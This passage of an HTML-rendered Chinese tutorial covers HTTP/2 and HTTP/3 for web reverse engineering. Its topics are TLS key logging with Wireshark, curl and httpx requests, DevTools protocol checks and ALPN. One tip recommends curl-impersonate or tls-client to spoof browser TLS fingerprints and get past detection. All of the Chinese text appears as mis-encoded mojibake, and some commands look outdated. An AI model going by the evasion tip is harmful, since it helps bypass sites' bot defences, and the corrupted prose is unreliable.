<span class="nb">export</span><span class="w"> </span><span class="nv">SSLKEYLOGFILE</span><span class="o">=</span>~/sslkeys.log
/Applications/Google<span class="se">\ </span>Chrome.app/Contents/MacOS/Google<span class="se">\ </span>Chrome

<span class="c1"># Windows</span>
<span class="nb">set</span><span class="w"> </span><span class="nv">SSLKEYLOGFILE</span><span class="o">=</span>C:<span class="se">\s</span>slkeys.log
<span class="s2">&quot;C:\Program Files\Google\Chrome\Application\chrome.exe&quot;</span>
</code></pre>
      </div>

      <p><strong>Wireshark é…ç½®</strong>:</p>

      <ol>
        <li><code>Edit</code> â†’ <code>Preferences</code> â†’ <code>Protocols</code> â†’ <code>TLS</code></li>
        <li><code>(Pre)-Master-Secret log filename</code>: é€‰æ‹© <code>sslkeys.log</code></li>
        <li>é‡å¯ Wireshark</li>
      </ol>

      <p><strong>åˆ†æ HTTP/2 å¸§</strong>:</p>

      <pre><code>Frame 123: HEADERS
  Stream ID: 3
  :method: GET
  :path: /api/data
  :authority: example.com

Frame 125: DATA
  Stream ID: 3
  Data Length: 1024
  Payload: {"result": ...}
</code></pre>

      <hr />

      <h4 id="ä½¿ç”¨-chrome-devtools">ä½¿ç”¨ Chrome DevTools</h4>

      <p><strong>æŸ¥çœ‹ HTTP/2 åè®®</strong>:</p>

      <ol>
        <li>Network é¢æ¿ â†’ å³é”®è¡¨å¤´ â†’ å‹¾é€‰ &#8220;Protocol&#8221;</li>
        <li>çœ‹åˆ° <code>h2</code> è¡¨ç¤º HTTP/2</li>
      </ol>

      <p><strong>æŸ¥çœ‹å¸§è¯¦æƒ…</strong> (å®éªŒæ€§):</p>

      <ol>
        <li><code>chrome://net-internals/#http2</code></li>
        <li>æŸ¥çœ‹æ´»è·ƒçš„ HTTP/2 ä¼šè¯å’Œæµ</li>
      </ol>

      <hr />

      <h3 id="23-http2-é€†å‘å®æˆ˜">2.3 HTTP/2 é€†å‘å®æˆ˜</h3>

      <h4 id="æ¡ˆä¾‹-å¤ç°-http2-è¯·æ±‚">æ¡ˆä¾‹: å¤ç° HTTP/2 è¯·æ±‚</h4>

      <p><strong>é—®é¢˜</strong>: <code>curl</code> é»˜è®¤ä½¿ç”¨ HTTP/1.1</p>

      <p><strong>è§£å†³</strong>: ä½¿ç”¨ <code>curl</code> çš„ HTTP/2 æ”¯æŒ</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># å¼ºåˆ¶ä½¿ç”¨ HTTP/2</span>
curl<span class="w"> </span>--http2<span class="w"> </span>https://example.com/api/data

<span class="c1"># æŸ¥çœ‹è¯¦ç»†ä¿¡æ¯</span>
curl<span class="w"> </span>--http2<span class="w"> </span>-v<span class="w"> </span>https://example.com/api/data

<span class="c1"># è¾“å‡ºç¤ºä¾‹</span>
*<span class="w"> </span>Using<span class="w"> </span>HTTP2,<span class="w"> </span>server<span class="w"> </span>supports<span class="w"> </span>multi-use
*<span class="w"> </span>Connection<span class="w"> </span>state<span class="w"> </span>changed<span class="w"> </span><span class="o">(</span>HTTP/2<span class="w"> </span>confirmed<span class="o">)</span>
*<span class="w"> </span>Using<span class="w"> </span>Stream<span class="w"> </span>ID:<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="o">(</span>easy<span class="w"> </span>handle<span class="w"> </span>0x7f9c8c004000<span class="o">)</span>
&gt;<span class="w"> </span>GET<span class="w"> </span>/api/data<span class="w"> </span>HTTP/2
&gt;<span class="w"> </span>Host:<span class="w"> </span>example.com
&gt;<span class="w"> </span>User-Agent:<span class="w"> </span>curl/7.79.1
</code></pre>
      </div>

      <p><strong>Python è¯·æ±‚ (ä½¿ç”¨ httpx)</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">httpx</span>

<span class="c1"># httpx é»˜è®¤æ”¯æŒ HTTP/2</span>
<span class="k">async</span> <span class="k">with</span> <span class="n">httpx</span><span class="o">.</span><span class="n">AsyncClient</span><span class="p">(</span><span class="n">http2</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span> <span class="k">as</span> <span class="n">client</span><span class="p">:</span>
    <span class="n">response</span> <span class="o">=</span> <span class="k">await</span> <span class="n">client</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;https://example.com/api/data&#39;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;HTTPç‰ˆæœ¬: </span><span class="si">{</span><span class="n">response</span><span class="o">.</span><span class="n">http_version</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>  <span class="c1"># HTTP/2</span>
    <span class="nb">print</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">json</span><span class="p">())</span>
</code></pre>
      </div>

      <hr />

      <h4 id="æ¡ˆä¾‹-è¯†åˆ«æœåŠ¡å™¨æ¨é€">æ¡ˆä¾‹: è¯†åˆ«æœåŠ¡å™¨æ¨é€</h4>

      <p><strong>åœ¨ Chrome DevTools ä¸­</strong>:</p>

      <ul>
        <li>Initiator åˆ—æ˜¾ç¤º &#8220;Push / Other&#8221;</li>
        <li>Protocol åˆ—æ˜¾ç¤º <code>h2</code></li>
      </ul>

      <p><strong>åœ¨ä»£ç ä¸­æ£€æµ‹</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// Service Worker ä¸­æ‹¦æˆªæœåŠ¡å™¨æ¨é€</span>
<span class="nx">self</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;push&#39;</span><span class="p">,</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">event</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Received server push:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">event</span><span class="p">);</span>
<span class="p">});</span>

<span class="c1">// æ€§èƒ½ API æ£€æµ‹</span>
<span class="nx">performance</span><span class="p">.</span><span class="nx">getEntriesByType</span><span class="p">(</span><span class="s1">&#39;navigation&#39;</span><span class="p">).</span><span class="nx">forEach</span><span class="p">(</span><span class="nx">entry</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">entry</span><span class="p">.</span><span class="nx">nextHopProtocol</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="s1">&#39;h2&#39;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;ä½¿ç”¨ HTTP/2&#39;</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">});</span>
</code></pre>
      </div>

      <hr />

      <h2 id="3-http3-è¯¦è§£">3. HTTP/3 è¯¦è§£</h2>

      <h3 id="31-æ ¸å¿ƒç‰¹æ€§">3.1 æ ¸å¿ƒç‰¹æ€§</h3>

      <h4 id="311-åŸºäº-quic-åè®®">3.1.1 åŸºäº QUIC åè®®</h4>

      <p><strong>QUIC (Quick UDP Internet Connections)</strong>:</p>

      <ul>
        <li>åŸºäº <strong>UDP</strong> è€Œé TCP</li>
        <li>å†…ç½® TLS 1.3 åŠ å¯†</li>
        <li>ç”± Google å¼€å‘ï¼Œåæ ‡å‡†åŒ–ä¸º IETF QUIC</li>
      </ul>

      <p><strong>åè®®æ ˆå¯¹æ¯”</strong>:</p>

      <pre><code>HTTP/1.1               HTTP/2                 HTTP/3
--------               ------                 ------
HTTP                   HTTP/2                 HTTP/3
TCP                    TCP                    QUIC
TLS                    TLS                    (å†…ç½® TLS 1.3)
IP                     IP                     UDP
                                             IP
</code></pre>

      <hr />

      <h4 id="312-0-rtt-è¿æ¥å»ºç«‹">3.1.2 0-RTT è¿æ¥å»ºç«‹</h4>

      <p><strong>TCP + TLS 1.2</strong> (HTTP/1.1, HTTP/2):</p>

      <pre><code>å®¢æˆ·ç«¯ -&gt; æœåŠ¡å™¨: SYN                       (1 RTT)
æœåŠ¡å™¨ -&gt; å®¢æˆ·ç«¯: SYN-ACK
å®¢æˆ·ç«¯ -&gt; æœåŠ¡å™¨: ACK

å®¢æˆ·ç«¯ -&gt; æœåŠ¡å™¨: ClientHello               (2 RTT)
æœåŠ¡å™¨ -&gt; å®¢æˆ·ç«¯: ServerHello, Certificate
å®¢æˆ·ç«¯ -&gt; æœåŠ¡å™¨: Finished

å®¢æˆ·ç«¯ -&gt; æœåŠ¡å™¨: HTTP Request              (3 RTT)
</code></pre>

      <p><strong>QUIC</strong> (HTTP/3):</p>

      <pre><code>é¦–æ¬¡è¿æ¥:
å®¢æˆ·ç«¯ -&gt; æœåŠ¡å™¨: Initial Packet (å« ClientHello)  (1 RTT)
æœåŠ¡å™¨ -&gt; å®¢æˆ·ç«¯: Handshake Packet
å®¢æˆ·ç«¯ -&gt; æœåŠ¡å™¨: HTTP Request                     (1 RTT å®Œæˆ)

åç»­è¿æ¥ (0-RTT):
å®¢æˆ·ç«¯ -&gt; æœåŠ¡å™¨: 0-RTT Packet (å«åŠ å¯†çš„ HTTP è¯·æ±‚)  (0 RTT!)
</code></pre>

      <p><strong>æ€§èƒ½æå‡</strong>: å¯å‡å°‘ 66% çš„æ¡æ‰‹å»¶è¿Ÿ</p>

      <hr />

      <h4 id="313-æ¶ˆé™¤é˜Ÿå¤´é˜»å¡">3.1.3 æ¶ˆé™¤é˜Ÿå¤´é˜»å¡</h4>

      <p><strong>HTTP/2 çš„é—®é¢˜</strong>: TCP å±‚é¢ä»æœ‰é˜Ÿå¤´é˜»å¡</p>

      <pre><code>TCP è¿æ¥
|
â”œâ”€â”€ Stream 1: â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ (ä¸¢åŒ…!) â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ
â”œâ”€â”€ Stream 3: â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ (ç­‰å¾…) â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ
â””â”€â”€ Stream 5: â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ (ç­‰å¾…) â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ
</code></pre>

      <p>å½“ TCP ä¸¢åŒ…æ—¶ï¼Œæ‰€æœ‰ HTTP/2 æµéƒ½ä¼šè¢«é˜»å¡ï¼Œç›´åˆ°é‡ä¼ å®Œæˆã€‚</p>

      <p><strong>HTTP/3 çš„è§£å†³</strong>: QUIC ç‹¬ç«‹æµ</p>

      <pre><code>QUIC è¿æ¥
|
â”œâ”€â”€ Stream 1: â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ (ä¸¢åŒ…!) â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ
â”œâ”€â”€ Stream 3: â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ (ç»§ç»­ä¼ è¾“) â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ
â””â”€â”€ Stream 5: â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ (ç»§ç»­ä¼ è¾“) â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ
</code></pre>

      <p>æ¯ä¸ª QUIC æµç‹¬ç«‹ï¼Œä¸¢åŒ…åªå½±å“å½“å‰æµã€‚</p>

      <hr />

      <h4 id="314-è¿æ¥è¿ç§»-connection-migration">3.1.4 è¿æ¥è¿ç§» (Connection Migration)</h4>

      <p><strong>åœºæ™¯</strong>: ç§»åŠ¨è®¾å¤‡ä» WiFi åˆ‡æ¢åˆ° 4G</p>

      <p><strong>TCP/HTTP/2</strong>: è¿æ¥æ–­å¼€ï¼Œéœ€è¦é‡æ–°å»ºç«‹</p>

      <pre><code>WiFi (IP: 192.168.1.10) ----X----&gt; åˆ‡æ¢åˆ° 4G (IP: 10.0.0.5)
éœ€è¦é‡æ–°ä¸‰æ¬¡æ¡æ‰‹ + TLS æ¡æ‰‹ + HTTP/2 å»ºç«‹
</code></pre>

      <p><strong>QUIC/HTTP/3</strong>: è¿æ¥ä¿æŒ</p>

      <pre><code>WiFi (è¿æ¥ ID: abc123) -----&gt; åˆ‡æ¢åˆ° 4G (è¿æ¥ ID: abc123)
é€šè¿‡è¿æ¥ ID è¯†åˆ«ï¼Œæ— éœ€é‡æ–°æ¡æ‰‹
</code></pre>

      <p><strong>ä¼˜åŠ¿</strong>:</p>

      <ul>
        <li>ç§»åŠ¨ç½‘ç»œåˆ‡æ¢æ— æ„ŸçŸ¥</li>
        <li>è§†é¢‘æ’­æ”¾ã€ä¸‹è½½ä¸ä¸­æ–­</li>
      </ul>

      <hr />

      <h3 id="32-http3-æŠ“åŒ…ä¸åˆ†æ">3.2 HTTP/3 æŠ“åŒ…ä¸åˆ†æ</h3>

      <h4 id="wireshark-æŠ“åŒ…-http3">Wireshark æŠ“åŒ… HTTP/3</h4>

      <p><strong>æ­¥éª¤</strong>:</p>

      <ol>
        <li><strong>æ•è· UDP æµé‡</strong>: HTTP/3 ä½¿ç”¨ UDP ç«¯å£ï¼ˆé€šå¸¸ 443ï¼‰</li>
        <li><strong>è§£å¯† QUIC</strong>: éœ€è¦ QUIC å¯†é’¥æ—¥å¿—</li>
      </ol>

      <p><strong>Chrome å¯¼å‡º QUIC å¯†é’¥</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="nb">export</span><span class="w"> </span><span class="nv">SSLKEYLOGFILE</span><span class="o">=</span>~/sslkeys.log
/Applications/Google<span class="se">\ </span>Chrome.app/Contents/MacOS/Google<span class="se">\ </span>Chrome<span class="w"> </span>--enable-quic
</code></pre>
      </div>

      <p><strong>Wireshark è¿‡æ»¤å™¨</strong>:</p>

      <pre><code>quic
http3
</code></pre>

      <hr />

      <h4 id="chrome-æŸ¥çœ‹-http3">Chrome æŸ¥çœ‹ HTTP/3</h4>

      <p><strong>æ£€æµ‹æ–¹æ³•</strong>:</p>

      <ol>
        <li><strong>Network é¢æ¿</strong>: Protocol åˆ—æ˜¾ç¤º <code>h3</code> æˆ– <code>h3-29</code></li>
        <li><strong>chrome://net-internals/#quic</strong>: æŸ¥çœ‹ QUIC ä¼šè¯è¯¦æƒ…</li>
        <li><strong>å¼€å‘è€…å·¥å…·</strong>: åœ¨ Network é¢æ¿çš„ Protocol åˆ—æŸ¥çœ‹</li>
      </ol>

      <p><strong>JavaScript æ£€æµ‹</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// æ£€æµ‹ HTTP ç‰ˆæœ¬</span>
<span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;https://example.com/api/data&#39;</span><span class="p">)</span>
<span class="w">    </span><span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">response</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">response</span><span class="p">.</span><span class="nx">headers</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;alt-svc&#39;</span><span class="p">));</span>
<span class="w">        </span><span class="c1">// è¾“å‡º: h3=&quot;:443&quot;; ma=2592000</span>
<span class="w">    </span><span class="p">});</span>

<span class="c1">// Performance API</span>
<span class="nx">performance</span><span class="p">.</span><span class="nx">getEntriesByType</span><span class="p">(</span><span class="s1">&#39;resource&#39;</span><span class="p">).</span><span class="nx">forEach</span><span class="p">(</span><span class="nx">entry</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">entry</span><span class="p">.</span><span class="nx">nextHopProtocol</span><span class="p">);</span><span class="w">  </span><span class="c1">// h3, h2, http/1.1</span>
<span class="p">});</span>
</code></pre>
      </div>

      <hr />

      <h3 id="33-http3-é€†å‘å®æˆ˜">3.3 HTTP/3 é€†å‘å®æˆ˜</h3>

      <h4 id="æ¡ˆä¾‹-ä½¿ç”¨-curl-å‘é€-http3-è¯·æ±‚">æ¡ˆä¾‹: ä½¿ç”¨ curl å‘é€ HTTP/3 è¯·æ±‚</h4>

      <p><strong>å®‰è£…æ”¯æŒ HTTP/3 çš„ curl</strong> (éœ€è¦ç¼–è¯‘):</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># macOS (ä½¿ç”¨ Homebrew)</span>
brew<span class="w"> </span>install<span class="w"> </span>curl<span class="w"> </span>--with-nghttp3

<span class="c1"># æ£€æŸ¥ç‰ˆæœ¬</span>
curl<span class="w"> </span>--version
<span class="c1"># Features: ... HTTP3 ...</span>
</code></pre>
      </div>

      <p><strong>å‘é€è¯·æ±‚</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># å¼ºåˆ¶ä½¿ç”¨ HTTP/3</span>
curl<span class="w"> </span>--http3<span class="w"> </span>https://cloudflare-quic.com/

<span class="c1"># æŸ¥çœ‹è¯¦ç»†ä¿¡æ¯</span>
curl<span class="w"> </span>--http3<span class="w"> </span>-v<span class="w"> </span>https://cloudflare-quic.com/
<span class="c1"># * Using HTTP/3 Stream ID: 0 (easy handle 0x...)</span>
<span class="c1"># &gt; GET / HTTP/3</span>
<span class="c1"># &gt; Host: cloudflare-quic.com</span>
</code></pre>
      </div>

      <hr />

      <h4 id="æ¡ˆä¾‹-python-ä½¿ç”¨-http3">æ¡ˆä¾‹: Python ä½¿ç”¨ HTTP/3</h4>

      <p><strong>ä½¿ç”¨ httpx</strong> (å®éªŒæ€§æ”¯æŒ):</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">httpx</span>

<span class="c1"># éœ€è¦å®‰è£… HTTP/3 æ”¯æŒ</span>
<span class="c1"># pip install httpx[http3]</span>

<span class="k">async</span> <span class="k">with</span> <span class="n">httpx</span><span class="o">.</span><span class="n">AsyncClient</span><span class="p">(</span><span class="n">http3</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span> <span class="k">as</span> <span class="n">client</span><span class="p">:</span>
    <span class="n">response</span> <span class="o">=</span> <span class="k">await</span> <span class="n">client</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;https://cloudflare-quic.com/&#39;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;HTTPç‰ˆæœ¬: </span><span class="si">{</span><span class="n">response</span><span class="o">.</span><span class="n">http_version</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>  <span class="c1"># HTTP/3</span>
    <span class="nb">print</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</code></pre>
      </div>

      <hr />

      <h2 id="4-ç‰ˆæœ¬å¯¹æ¯”æ€»ç»“">4. ç‰ˆæœ¬å¯¹æ¯”æ€»ç»“</h2>

      <table>
        <thead>
          <tr>
            <th>ç‰¹æ€§</th>
            <th>HTTP/1.1</th>
            <th>HTTP/2</th>
            <th>HTTP/3</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong>åè®®ç±»å‹</strong></td>
            <td>æ–‡æœ¬</td>
            <td>äºŒè¿›åˆ¶</td>
            <td>äºŒè¿›åˆ¶</td>
          </tr>
          <tr>
            <td><strong>ä¼ è¾“å±‚</strong></td>
            <td>TCP</td>
            <td>TCP</td>
            <td>UDP (QUIC)</td>
          </tr>
          <tr>
            <td><strong>åŠ å¯†</strong></td>
            <td>å¯é€‰ (HTTPS)</td>
            <td>å¼ºåˆ¶ TLS</td>
            <td>å†…ç½® TLS 1.3</td>
          </tr>
          <tr>
            <td><strong>å¤šè·¯å¤ç”¨</strong></td>
            <td>âŒ</td>
            <td>âœ…</td>
            <td>âœ…</td>
          </tr>
          <tr>
            <td><strong>é˜Ÿå¤´é˜»å¡</strong></td>
            <td>ä¸¥é‡</td>
            <td>TCP å±‚</td>
            <td>æ— </td>
          </tr>
          <tr>
            <td><strong>å¤´éƒ¨å‹ç¼©</strong></td>
            <td>âŒ</td>
            <td>HPACK</td>
            <td>QPACK</td>
          </tr>
          <tr>
            <td><strong>æœåŠ¡å™¨æ¨é€</strong></td>
            <td>âŒ</td>
            <td>âœ…</td>
            <td>âœ…</td>
          </tr>
          <tr>
            <td><strong>è¿æ¥å»ºç«‹</strong></td>
            <td>3 RTT (TCP+TLS)</td>
            <td>3 RTT</td>
            <td>1 RTT (0-RTT å¯ç”¨)</td>
          </tr>
          <tr>
            <td><strong>è¿æ¥è¿ç§»</strong></td>
            <td>âŒ</td>
            <td>âŒ</td>
            <td>âœ…</td>
          </tr>
          <tr>
            <td><strong>æµè§ˆå™¨æ”¯æŒ</strong></td>
            <td>100%</td>
            <td>97%+</td>
            <td>75%+ (å¢é•¿ä¸­)</td>
          </tr>
        </tbody>
      </table>

      <hr />

      <h2 id="5-é€†å‘å·¥ç¨‹æ³¨æ„äº‹é¡¹">5. é€†å‘å·¥ç¨‹æ³¨æ„äº‹é¡¹</h2>

      <h3 id="51-åè®®åå•†-alpn">5.1 åè®®åå•† (ALPN)</h3>

      <p>æœåŠ¡å™¨é€šè¿‡ <strong>ALPN (Application-Layer Protocol Negotiation)</strong> å‘ŠçŸ¥å®¢æˆ·ç«¯æ”¯æŒçš„åè®®ã€‚</p>

      <p><strong>TLS æ¡æ‰‹ä¸­çš„ ALPN</strong>:</p>

      <pre><code>ClientHello:
  ALPN Extension: [h2, http/1.1]

ServerHello:
  ALPN Extension: h2
</code></pre>

      <p><strong>HTTP/3 åå•†</strong> (é€šè¿‡ Alt-Svc å¤´):</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kr">HTTP</span><span class="o">/</span><span class="m">2</span> <span class="m">200</span> <span class="ne">OK</span>
<span class="na">Alt-Svc</span><span class="o">:</span> <span class="l">h3=&quot;:443&quot;; ma=2592000</span>

# ma = max-age (ç¼“å­˜æ—¶é—´)
</code></pre>
      </div>

      <p>å®¢æˆ·ç«¯æ”¶åˆ°åï¼Œåç»­è¯·æ±‚ä¼šå°è¯•ä½¿ç”¨ HTTP/3ã€‚</p>

      <hr />

      <h3 id="52-æŠ“åŒ…å·¥å…·é€‰æ‹©">5.2 æŠ“åŒ…å·¥å…·é€‰æ‹©</h3>

      <table>
        <thead>
          <tr>
            <th>å·¥å…·</th>
            <th>HTTP/1.1</th>
            <th>HTTP/2</th>
            <th>HTTP/3</th>
            <th>å¤‡æ³¨</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong>Wireshark</strong></td>
            <td>âœ…</td>
            <td>âœ…</td>
            <td>âœ…</td>
            <td>éœ€è¦é…ç½®è§£å¯†</td>
          </tr>
          <tr>
            <td><strong>Chrome DevTools</strong></td>
            <td>âœ…</td>
            <td>âœ…</td>
            <td>âœ…</td>
            <td>æœ€æ–¹ä¾¿</td>
          </tr>
          <tr>
            <td><strong>Burp Suite</strong></td>
            <td>âœ…</td>
            <td>âœ…</td>
            <td>âŒ</td>
            <td>ä¸æ”¯æŒ HTTP/3</td>
          </tr>
          <tr>
            <td><strong>Charles Proxy</strong></td>
            <td>âœ…</td>
            <td>âœ…</td>
            <td>âŒ</td>
            <td>ä¸æ”¯æŒ HTTP/3</td>
          </tr>
          <tr>
            <td><strong>mitmproxy</strong></td>
            <td>âœ…</td>
            <td>âœ…</td>
            <td>âš ï¸</td>
            <td>å®éªŒæ€§æ”¯æŒ</td>
          </tr>
        </tbody>
      </table>

      <p><strong>æ³¨æ„</strong>: å¤§éƒ¨åˆ† MITM ä»£ç†å·¥å…·ä¸æ”¯æŒ HTTP/3ï¼Œå› ä¸º QUIC éš¾ä»¥ä¸­é—´äººæ”»å‡»ã€‚</p>

      <hr />

      <h3 id="53-è‡ªåŠ¨åŒ–å·¥å…·å…¼å®¹æ€§">5.3 è‡ªåŠ¨åŒ–å·¥å…·å…¼å®¹æ€§</h3>

      <h4 id="puppeteer-playwright">Puppeteer / Playwright</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// é»˜è®¤æ”¯æŒ HTTP/2 å’Œ HTTP/3</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">browser</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">puppeteer</span><span class="p">.</span><span class="nx">launch</span><span class="p">();</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">page</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">browser</span><span class="p">.</span><span class="nx">newPage</span><span class="p">();</span>

<span class="k">await</span><span class="w"> </span><span class="nx">page</span><span class="p">.</span><span class="kr">goto</span><span class="p">(</span><span class="s1">&#39;https://cloudflare-quic.com/&#39;</span><span class="p">);</span>

<span class="c1">// æ£€æµ‹åè®®ç‰ˆæœ¬</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">protocol</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">page</span><span class="p">.</span><span class="nx">evaluate</span><span class="p">(()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">performance</span><span class="p">.</span><span class="nx">getEntriesByType</span><span class="p">(</span><span class="s1">&#39;navigation&#39;</span><span class="p">)[</span><span class="mf">0</span><span class="p">].</span><span class="nx">nextHopProtocol</span><span class="p">;</span>
<span class="p">});</span>

<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`ä½¿ç”¨åè®®: </span><span class="si">${</span><span class="nx">protocol</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span><span class="w">  </span><span class="c1">// h2 æˆ– h3</span>
</code></pre>
      </div>

      <h4 id="requests-python">Requests (Python)</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>

<span class="c1"># requests é»˜è®¤åªæ”¯æŒ HTTP/1.1</span>
<span class="c1"># éœ€è¦ä½¿ç”¨ httpx æˆ– urllib3 çš„æ–°ç‰ˆæœ¬</span>

<span class="kn">import</span><span class="w"> </span><span class="nn">httpx</span>

<span class="k">async</span> <span class="k">with</span> <span class="n">httpx</span><span class="o">.</span><span class="n">AsyncClient</span><span class="p">(</span><span class="n">http2</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span> <span class="k">as</span> <span class="n">client</span><span class="p">:</span>
    <span class="n">response</span> <span class="o">=</span> <span class="k">await</span> <span class="n">client</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;https://example.com/&#39;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">http_version</span><span class="p">)</span>  <span class="c1"># HTTP/2</span>
</code></pre>
      </div>

      <hr />

      <h3 id="54-tls-æŒ‡çº¹è¯†åˆ«">5.4 TLS æŒ‡çº¹è¯†åˆ«</h3>

      <p>HTTP/2 å’Œ HTTP/3 çš„ä½¿ç”¨ä¼šå½±å“ TLS æŒ‡çº¹ã€‚</p>

      <p><strong>JA3 æŒ‡çº¹å·®å¼‚</strong>:</p>

      <pre><code>HTTP/1.1 Client:
  ALPN: [http/1.1]

HTTP/2 Client:
  ALPN: [h2, http/1.1]

HTTP/3 Client:
  ALPN: [h3, h2, http/1.1]
</code></pre>

      <p><strong>å¯¹æŠ—æ–¹æ³•</strong>: ä½¿ç”¨ <code>curl-impersonate</code> æˆ– <code>tls-client</code> åº“æ¨¡æ‹ŸçœŸå®æµè§ˆå™¨æŒ‡çº¹ã€‚</p>

      <hr />

      <h2 id="6-æ€§èƒ½ä¼˜åŒ–å»ºè®®">6. æ€§èƒ½ä¼˜åŒ–å»ºè®®</h2>

      <h3 id="61-é’ˆå¯¹-http2">6.1 é’ˆå¯¹ HTTP/2</h3>

      <ol>
        <li><strong>å‡å°‘åŸŸååˆ†ç‰‡</strong>: HTTP/2 ä¸éœ€è¦å¤šåŸŸåï¼Œåè€Œæœ‰å®³</li>
        <li><strong>é¿å…å†…è”èµ„æº</strong>: HTTP/2 çš„å¤šè·¯å¤ç”¨ä½¿ç‹¬ç«‹æ–‡ä»¶æ›´é«˜æ•ˆ</li>
        <li><strong>ä½¿ç”¨æœåŠ¡å™¨æ¨é€</strong>: é¢„æ¨é€å…³é”® CSS/JS</li>
        <li><strong>åˆç†è®¾ç½®ä¼˜å…ˆçº§</strong>: æ ‡è®°å…³é”®èµ„æºçš„ä¼˜å…ˆçº§</li>
      </ol>

      <hr />

      <h3 id="62-é’ˆå¯¹-http3">6.2 é’ˆå¯¹ HTTP/3</h3>

      <ol>
        <li><strong>å¯ç”¨ 0-RTT</strong>: å‡å°‘é‡å¤è®¿é—®çš„å»¶è¿Ÿ</li>
        <li><strong>ä¼˜åŒ– UDP</strong>: ç¡®ä¿é˜²ç«å¢™ä¸é˜»æ­¢ UDP 443</li>
        <li><strong>é™çº§ç­–ç•¥</strong>: åœ¨ HTTP/3 å¤±è´¥æ—¶é™çº§åˆ° HTTP/2</li>
      </ol>

      <hr />

      <h2 id="7-å¸¸è§é—®é¢˜">7. å¸¸è§é—®é¢˜</h2>

